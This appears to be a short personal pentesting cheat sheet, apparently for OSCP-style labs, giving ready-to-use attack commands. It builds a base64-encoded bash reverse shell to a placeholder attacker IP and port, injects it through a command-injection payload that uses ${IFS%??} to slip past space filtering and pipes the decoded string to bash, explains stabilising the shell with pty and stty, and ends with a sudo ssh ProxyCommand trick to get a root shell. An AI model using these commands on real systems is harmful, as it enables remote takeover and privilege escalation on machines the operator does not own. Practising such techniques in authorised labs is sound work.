
Create Payload
```bash
echo "bash -i >& /dev/tcp/<your-ip>/<your-port> 0>&1" | base64 -w 0
```
Create reverse Shell
```bash
;echo${IFS%??}"<your payload here>"${IFS%??}|${IFS%??}base64${IFS%??}-d${IFS%??}|${IFS%??}bash;
```

Make the shell stable:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'  
export TERM=xterm  
ctrl + z  
stty raw -echo; fg
```
explanation:
https://www.reddit.com/r/oscp/comments/tjzega/reason_to_use_stty_raw_echo_for_making_an/
When you get a reverse shell, whatever you type in is echoed back before execution. You don't have to disable this, but it can be annoying. I'm assuming this is a behavior of netcat.
Ctrl z backgrounds the application, and fg brings it back to the foreground. This gives you your host terminal back for you to change its behavior.
Pressing enter twice ensures you get your prompt back. The first enter being the shell back to the foreground, the second one is interpreted by the reverse shell and prints the prompt again.

#### Privilege escalation
Run the following command in an SSH session to run as superuser (root)[[Privilege escalation]]
```BASH
sudo ssh -o ProxyCommand=';sh 0<&2 1>&2' x
```


